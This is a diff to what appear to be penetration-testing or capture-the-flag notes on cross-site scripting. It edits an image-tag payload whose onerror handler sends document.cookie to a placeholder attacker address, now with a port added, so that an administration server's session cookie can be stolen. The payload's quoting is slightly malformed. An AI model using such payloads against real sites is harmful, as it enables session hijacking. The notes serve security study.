@@ -51,7 +51,7 @@ If an attacker can inject this code into a web page by manipulating user-generat
 # Obtaining Cookie
 If we can introduce XSS code into a petition that will be processed by the administration server, we can try to obtain it's cookie by running the following code: 
 ```bash
-<img src'x' onerror=fetch('http://<own-ip>/+document.cookie);>
+<img src'x' onerror=fetch('http://<own-ip>:<port>/+document.cookie);>
 ```
 With this petition we induce the victim server to execute JS code. With this code the server tries to execute  a wrong image and on the error sends it's cookie to our machine. Before executing this payload is necessary to open a local port.
 ```bash
